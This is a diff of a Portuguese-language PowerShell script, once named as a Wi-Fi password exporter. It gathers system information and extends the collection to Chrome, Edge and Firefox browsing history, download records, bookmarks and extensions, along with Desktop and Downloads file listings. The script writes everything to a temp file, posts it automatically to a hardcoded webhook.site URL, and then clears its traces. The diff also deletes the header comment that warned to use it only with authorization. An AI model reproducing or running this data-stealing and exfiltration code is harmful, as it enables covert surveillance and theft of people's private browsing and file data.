@@ -1,21 +1,11 @@
-<#
-    exporta-wifi-const.ps1
-
-    Versão modificada:
-      - Não usa parâmetros
-      - A URL do webhook é definida como constante (variável no topo) e deve ser editada antes do uso
-      - Ao executar o script ele gera o arquivo e envia para o webhook (se $WebhookUrl estiver preenchida)
-
-    ATENÇÃO: use apenas em máquinas ou ambientes com autorização.
-#>
-
-# === CONFIGURAÇÕES (edite aqui antes de executar) ===
 
 # Deixe vazio ('') se não quiser enviar automaticamente para webhook
-$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'
+$WebhookUrl = 'https://webhook.site/77d0d5d4-f7e9-43ac-810c-0bf2139be510'
 
-
+# Pasta de exportação (padrão: %TEMP%\p)
 $ExportDirDefault = Join-Path $env:TEMP 'p'
+# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
+
 $OutputFileDefault = Join-Path $env:TEMP 'system_info.txt'
 
 function Get-SystemInfo {
@@ -310,57 +300,552 @@ function Get-SystemInfo {
     $events=&$try{Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50}
     if($events){
         & $add ''; & $add 'ERROS/CRÍTICOS DO SYSTEM (7 DIAS):'
-        $events|%{&$add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"}
+        $events|%{
+            & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"
+        }
     }
 
     $appEvents=&$try{Get-WinEvent -FilterHashtable @{LogName='Application';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -MaxEvents 50}
     if($appEvents){
         & $add ''; & $add 'ERROS/CRÍTICOS DE APLICATIVOS (7 DIAS):'
-        $appEvents|%{&$add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"}
+        $appEvents|%{
+            & $add "  - $($_.TimeCreated) | ID $($_.Id) | $($_.ProviderName) | $(if($_.Message){$m=$_.Message -replace '\s+',' ';$m.Substring(0,[math]::Min(180,$m.Length))})"
+        }
     }
 
     $dumps=&$try{Get-ChildItem "$env:SystemRoot\Minidump\*.dmp" -File}
-    if($dumps){&$add ''; & $add 'MINIDUMPS:';$dumps|sort LastWriteTime -Desc|select -First 20|%{&$add "  - $($_.FullName) | $($_.LastWriteTime) | $([math]::Round($_.Length/1MB,1)) MB"}}
+    if($dumps){
+        & $add ''; & $add 'MINIDUMPS:'
+        $dumps|sort LastWriteTime -Desc|select -First 20|%{
+            &$add "  - $($_.FullName) | $($_.LastWriteTime) | $([math]::Round($_.Length/1MB,1)) MB"
+        }
+    }
 
     & $sec '## 11. ARQUIVOS RECENTES'
     & $add "Limite: $RecentFiles por categoria"
 
+    # ------------------------------------------------------------
+    # ARQUIVOS RECENTES DO WINDOWS
+    # ------------------------------------------------------------
     $recentRoot=Join-Path $env:APPDATA 'Microsoft\Windows\Recent'
-    $recent=&$try{Get-ChildItem $recentRoot -File|sort LastWriteTime -Desc|select -First $RecentFiles}
-    if($recent){
-        & $add 'ITENS DA PASTA RECENTES DO WINDOWS:'
-        $recent|%{&$add "  - $($_.LastWriteTime) | $($_.Name) | $($_.FullName)"}
+    $recent=&$try{
+        Get-ChildItem $recentRoot -File |
+        sort LastWriteTime -Desc |
+        select -First $RecentFiles
     }
 
-    # Pesquisa limitada a diretórios de uso comum, evitando varredura indiscriminada do perfil.
-    $scan=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads")
+    if($recent){
+        & $add 'ITENS DA PASTA RECENTES DO WINDOWS:'
+        $recent|%{
+            &$add "  - $($_.LastWriteTime) | $($_.Name) | $($_.FullName)"
+        }
+    }
+
+    # ------------------------------------------------------------
+    # DOWNLOADS
+    # ------------------------------------------------------------
+    $downloadsRoot=Join-Path $env:USERPROFILE 'Downloads'
+    $downloads=&$try{
+        Get-ChildItem $downloadsRoot -File -Force -ErrorAction SilentlyContinue |
+        sort LastWriteTime -Desc |
+        select -First $RecentFiles
+    }
+
+    & $add ''
+    & $add 'ARQUIVOS PRESENTES EM DOWNLOADS:'
+
+    if($downloads){
+        $downloads|%{
+            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.Name) | $($_.FullName)"
+        }
+    }else{
+        &$add '  [nenhum arquivo encontrado ou pasta indisponível]'
+    }
+
+    # ------------------------------------------------------------
+    # DESKTOP
+    # ------------------------------------------------------------
+    $desktopRoot=[Environment]::GetFolderPath('Desktop')
+    $desktop=&$try{
+        Get-ChildItem $desktopRoot -File -Force -ErrorAction SilentlyContinue |
+        sort LastWriteTime -Desc
+    }
+
+    & $add ''
+    & $add 'ARQUIVOS PRESENTES NO DESKTOP:'
+
+    if($desktop){
+        $desktop|%{
+            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.Name) | $($_.FullName)"
+        }
+    }else{
+        &$add '  [nenhum arquivo encontrado ou Desktop indisponível]'
+    }
+
+    # ------------------------------------------------------------
+    # ARQUIVOS RECENTEMENTE MODIFICADOS
+    # ------------------------------------------------------------
+    $scan=@(
+        "$env:USERPROFILE\Desktop"
+        "$env:USERPROFILE\Documents"
+        "$env:USERPROFILE\Downloads"
+    )
+
     $files=&$try{
         Get-ChildItem $scan -File -Force -ErrorAction SilentlyContinue |
         ? FullName -notmatch '\\AppData\\' |
-        sort LastWriteTime -Desc | select -First $RecentFiles
-    }
-    if($files){
-        & $add ''; & $add 'ARQUIVOS RECENTEMENTE MODIFICADOS:'
-        $files|%{&$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.FullName)"}
+        sort LastWriteTime -Desc |
+        select -First $RecentFiles
     }
 
-    & $sec '## 12. AMBIENTE'
+    if($files){
+        & $add ''
+        & $add 'ARQUIVOS RECENTEMENTE MODIFICADOS:'
+
+        $files|%{
+            &$add "  - $($_.LastWriteTime) | $([math]::Round($_.Length/1KB,1)) KB | $($_.FullName)"
+        }
+    }
+
+    # ============================================================
+    # 12. NAVEGADORES
+    # ============================================================
+
+    & $sec '## 12. NAVEGADORES / HISTÓRICO / DOWNLOADS / FAVORITOS / EXTENSÕES'
+
+    # ------------------------------------------------------------
+    # Localiza executáveis dos navegadores
+    # ------------------------------------------------------------
+    $browserRoots=@(
+        [pscustomobject]@{
+            Name='Google Chrome'
+            UserRoot="$env:LOCALAPPDATA\Google\Chrome\User Data"
+        }
+        [pscustomobject]@{
+            Name='Microsoft Edge'
+            UserRoot="$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        }
+        [pscustomobject]@{
+            Name='Mozilla Firefox'
+            UserRoot="$env:APPDATA\Mozilla\Firefox\Profiles"
+        }
+    )
+
+    # ------------------------------------------------------------
+    # Helper SQLite
+    #
+    # Não altera a interface da função. Apenas tenta utilizar um
+    # provider SQLite já existente no computador.
+    # ------------------------------------------------------------
+    $sqliteProvider=$null
+    $sqliteType=$null
+
+    try{
+        Add-Type -AssemblyName System.Data.SQLite -ErrorAction Stop
+        $sqliteType=[System.Data.SQLite.SQLiteConnection]
+        $sqliteProvider='System.Data.SQLite'
+    }catch{}
+
+    if(!$sqliteType){
+        try{
+            Add-Type -AssemblyName Microsoft.Data.Sqlite -ErrorAction Stop
+            $sqliteType=[Microsoft.Data.Sqlite.SqliteConnection]
+            $sqliteProvider='Microsoft.Data.Sqlite'
+        }catch{}
+    }
+
+    function Invoke-BrowserSQLite {
+        param(
+            [string]$Database,
+            [string]$Query
+        )
+
+        if(!$sqliteType){return $null}
+        if(!(Test-Path $Database)){return $null}
+
+        $tmp=Join-Path $env:TEMP ("sysinfo_sqlite_{0}.db" -f ([guid]::NewGuid().ToString('N')))
+
+        try{
+            Copy-Item $Database $tmp -Force -ErrorAction Stop
+
+            if($sqliteProvider -eq 'System.Data.SQLite'){
+                $cn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Read Only=True;")
+            }else{
+                $cn=New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$tmp;Mode=ReadOnly")
+            }
+
+            $cn.Open()
+            $cmd=$cn.CreateCommand()
+            $cmd.CommandText=$Query
+            $rd=$cmd.ExecuteReader()
+
+            $table=New-Object System.Data.DataTable
+            $table.Load($rd)
+
+            $rd.Dispose()
+            $cmd.Dispose()
+            $cn.Close()
+            $cn.Dispose()
+
+            return $table
+        }catch{
+            return $null
+        }finally{
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    foreach($browser in $browserRoots){
+
+        if(!(Test-Path $browser.UserRoot)){
+            continue
+        }
+
+        & $add ''
+        & $add $browser.Name.ToUpper()
+        & $add ('-' * 78)
+
+        # ========================================================
+        # CHROME / EDGE
+        # ========================================================
+        if($browser.Name -ne 'Mozilla Firefox'){
+
+            $profiles=&$try{
+                Get-ChildItem $browser.UserRoot -Directory |
+                ? {
+                    $_.Name -eq 'Default' -or
+                    $_.Name -like 'Profile *'
+                }
+            }
+
+            foreach($profile in $profiles){
+
+                $pn=$profile.Name
+                & $add ''
+                & $add "PERFIL: $pn"
+
+                # ------------------------------------------------
+                # Histórico
+                # ------------------------------------------------
+                $historyDb=Join-Path $profile.FullName 'History'
+
+                if(Test-Path $historyDb){
+
+                    $q=@'
+SELECT
+    urls.url AS URL,
+    urls.title AS Titulo,
+    datetime((visits.visit_time/1000000)-11644473600,'unixepoch','localtime') AS Data
+FROM visits
+JOIN urls ON visits.url=urls.id
+ORDER BY visits.visit_time DESC
+LIMIT 100
+'@
+
+                    $hist=&$try{Invoke-BrowserSQLite $historyDb $q}
+
+                    & $add 'HISTÓRICO DE NAVEGAÇÃO:'
+
+                    if($hist){
+                        $hist|%{
+                            &$add "  - $($_.Data) | $($_.Titulo) | $($_.URL)"
+                        }
+                    }elseif($sqliteType){
+                        &$add '  [histórico localizado, mas não foi possível consultar o banco]'
+                    }else{
+                        &$add '  [SQLite não disponível para consulta deste banco]'
+                    }
+
+                    # ------------------------------------------------
+                    # Downloads do navegador
+                    # ------------------------------------------------
+                    $q=@'
+SELECT
+    target_path AS Arquivo,
+    tab_url AS URL,
+    datetime((start_time/1000000)-11644473600,'unixepoch','localtime') AS Data
+FROM downloads
+ORDER BY start_time DESC
+LIMIT 100
+'@
+
+                    $dl=&$try{Invoke-BrowserSQLite $historyDb $q}
+
+                    & $add ''
+                    & $add 'DOWNLOADS DO NAVEGADOR:'
+
+                    if($dl){
+                        $dl|%{
+                            &$add "  - $($_.Data) | $($_.Arquivo) | Origem: $($_.URL)"
+                        }
+                    }elseif($sqliteType){
+                        &$add '  [banco localizado, mas consulta indisponível]'
+                    }else{
+                        &$add '  [SQLite não disponível]'
+                    }
+                }
+
+                # ------------------------------------------------
+                # Favoritos
+                # ------------------------------------------------
+                $bookmark=Join-Path $profile.FullName 'Bookmarks'
+
+                if(Test-Path $bookmark){
+
+                    & $add ''
+                    & $add 'FAVORITOS:'
+
+                    try{
+                        $json=Get-Content $bookmark -Raw -Encoding UTF8 |
+                            ConvertFrom-Json
+
+                        $walkBookmark={
+                            param($node)
+
+                            if($node.children){
+                                foreach($child in $node.children){
+                                    if($child.type -eq 'url'){
+                                        &$add "  - $($child.name) | $($child.url)"
+                                    }
+
+                                    if($child.children){
+                                        &$walkBookmark $child
+                                    }
+                                }
+                            }
+                        }
+
+                        if($json.roots){
+                            foreach($root in $json.roots.PSObject.Properties){
+                                if($root.Value){
+                                    &$walkBookmark $root.Value
+                                }
+                            }
+                        }
+                    }catch{
+                        &$add '  [não foi possível interpretar o arquivo de favoritos]'
+                    }
+                }
+
+                # ------------------------------------------------
+                # Extensões / Plugins
+                # ------------------------------------------------
+                $extRoot=Join-Path $profile.FullName 'Extensions'
+
+                if(Test-Path $extRoot){
+
+                    & $add ''
+                    & $add 'EXTENSÕES / PLUGINS:'
+
+                    $extensions=&$try{
+                        Get-ChildItem $extRoot -Directory
+                    }
+
+                    foreach($ext in $extensions){
+
+                        $manifest=&$try{
+                            Get-ChildItem $ext.FullName -Filter manifest.json -Recurse -File |
+                            select -First 1
+                        }
+
+                        if($manifest){
+
+                            try{
+                                $m=Get-Content $manifest.FullName -Raw -Encoding UTF8 |
+                                    ConvertFrom-Json
+
+                                $name=$m.name
+                                $version=$m.version
+
+                                if($name -and $name -match '^__MSG_'){
+                                    $name=$ext.Name
+                                }
+
+                                &$add "  - $name | Versão: $version | ID: $($ext.Name)"
+                            }catch{
+                                &$add "  - ID: $($ext.Name)"
+                            }
+                        }else{
+                            &$add "  - ID: $($ext.Name)"
+                        }
+                    }
+                }
+            }
+        }
+
+        # ========================================================
+        # FIREFOX
+        # ========================================================
+        else{
+
+            $profiles=&$try{
+                Get-ChildItem $browser.UserRoot -Directory
+            }
+
+            foreach($profile in $profiles){
+
+                & $add ''
+                & $add "PERFIL: $($profile.Name)"
+
+                $places=Join-Path $profile.FullName 'places.sqlite'
+
+                if(Test-Path $places){
+
+                    # ------------------------------------------------
+                    # Histórico Firefox
+                    # ------------------------------------------------
+                    $q=@'
+SELECT
+    moz_places.url AS URL,
+    moz_places.title AS Titulo,
+    datetime(moz_historyvisits.visit_date/1000000,'unixepoch','localtime') AS Data
+FROM moz_historyvisits
+JOIN moz_places ON moz_historyvisits.place_id=moz_places.id
+ORDER BY moz_historyvisits.visit_date DESC
+LIMIT 100
+'@
+
+                    $hist=&$try{Invoke-BrowserSQLite $places $q}
+
+                    & $add 'HISTÓRICO DE NAVEGAÇÃO:'
+
+                    if($hist){
+                        $hist|%{
+                            &$add "  - $($_.Data) | $($_.Titulo) | $($_.URL)"
+                        }
+                    }elseif($sqliteType){
+                        &$add '  [histórico localizado, mas não foi possível consultar o banco]'
+                    }else{
+                        &$add '  [SQLite não disponível]'
+                    }
+
+                    # ------------------------------------------------
+                    # Downloads Firefox
+                    #
+                    # Dependendo da versão do Firefox, informações
+                    # de downloads podem estar em moz_annos.
+                    # ------------------------------------------------
+                    $q=@'
+SELECT
+    p.url AS URL,
+    p.title AS Titulo,
+    a.content AS Informacao
+FROM moz_annos a
+JOIN moz_places p ON a.place_id=p.id
+WHERE a.content LIKE '%download%'
+ORDER BY a.id DESC
+LIMIT 100
+'@
+
+                    $dl=&$try{Invoke-BrowserSQLite $places $q}
+
+                    & $add ''
+                    & $add 'DOWNLOADS DO NAVEGADOR:'
+
+                    if($dl){
+                        $dl|%{
+                            &$add "  - $($_.URL) | $($_.Titulo) | $($_.Informacao)"
+                        }
+                    }else{
+                        &$add '  [nenhum registro de download disponível no banco]'
+                    }
+
+                    # ------------------------------------------------
+                    # Favoritos Firefox
+                    # ------------------------------------------------
+                    $q=@'
+SELECT
+    b.title AS Titulo,
+    p.url AS URL
+FROM moz_bookmarks b
+JOIN moz_places p ON b.fk=p.id
+WHERE b.type=1
+ORDER BY b.dateAdded DESC
+LIMIT 500
+'@
+
+                    $fav=&$try{Invoke-BrowserSQLite $places $q}
+
+                    & $add ''
+                    & $add 'FAVORITOS:'
+
+                    if($fav){
+                        $fav|%{
+                            &$add "  - $($_.Titulo) | $($_.URL)"
+                        }
+                    }else{
+                        &$add '  [nenhum favorito localizado]'
+                    }
+                }
+
+                # ------------------------------------------------
+                # Extensões Firefox
+                # ------------------------------------------------
+                $addons=Join-Path $profile.FullName 'extensions.json'
+
+                if(Test-Path $addons){
+
+                    & $add ''
+                    & $add 'EXTENSÕES / PLUGINS:'
+
+                    try{
+                        $j=Get-Content $addons -Raw -Encoding UTF8 |
+                            ConvertFrom-Json
+
+                        if($j.addons){
+                            $j.addons|%{
+                                if($_.active -or $_.userDisabled -eq $false){
+                                    &$add "  - $($_.defaultLocale.name) | Versão: $($_.version) | ID: $($_.id)"
+                                }
+                            }
+                        }
+                    }catch{
+                        &$add '  [não foi possível interpretar extensions.json]'
+                    }
+                }
+            }
+        }
+    }
+
+    # ============================================================
+    # 13. AMBIENTE
+    # ============================================================
+
+    & $sec '## 13. AMBIENTE'
+
     foreach($n in 'PATH','APPDATA','PROGRAMDATA','SYSTEMDRIVE','SYSTEMROOT','TEMP','TMP','USERNAME','COMPUTERNAME'){
         $v=[Environment]::GetEnvironmentVariable($n)
+
         if($v){
-            $v=if($v.Length -gt 80){$v.Substring(0,40)+'...'+$v.Substring($v.Length-30)}else{$v}
+            $v=if($v.Length -gt 80){
+                $v.Substring(0,40)+'...'+$v.Substring($v.Length-30)
+            }else{
+                $v
+            }
+
             &$add "  $n = $v"
         }
     }
 
-    & $add ''; & $add $sep; & $add 'FIM DO RELATÓRIO'; & $add $sep
+    & $add ''
+    & $add $sep
+    & $add 'FIM DO RELATÓRIO'
+    & $add $sep
 
     try{
-        if(!(Test-Path $ExportDir -PathType Container)){New-Item $ExportDir -ItemType Directory -Force|Out-Null}
+        if(!(Test-Path $ExportDir -PathType Container)){
+            New-Item $ExportDir -ItemType Directory -Force|Out-Null
+        }
+
         $sb.ToString()|Out-File $OutputFile -Encoding UTF8 -Force
+
         Write-Host "Relatório salvo em: $OutputFile"
+
         return $OutputFile
-    }catch{Write-Error "Falha ao salvar relatório em $OutputFile`: $_"}
+    }
+    catch{
+        Write-Error "Falha ao salvar relatório em $OutputFile`: $_"
+    }
 }
 
 
@@ -535,16 +1020,23 @@ function Clear-All {
 }
 
 #### Executa ####
-$out = Invoke-DataDump `
-    -DumpCommand { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault } `
-    -OutputFile $OutputFileDefault `
-    -ExportDir $ExportDirDefault
+$dumpParams = @{
+    DumpCommand = { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
+    OutputFile  = $OutputFileDefault
+    ExportDir   = $ExportDirDefault
+}
+$out = Invoke-DataDump @dumpParams
 
-Send-DumpToWebhook `
-    -FilePath $out `
-    -WebhookUrl $WebhookUrl `
-    -Title "System Info" `
-    -ExportDir $ExportDirDefault `
-    -RemoveExportDir
+#### Envia
+$webhookParams = @{
+    FilePath        = $out
+    WebhookUrl      = $WebhookUrl
+    Title           = "System Info"
+    ExportDir       = $ExportDirDefault
+    RemoveExportDir = $true
+}
+Send-DumpToWebhook @webhookParams
 
 Clear-All
+
+
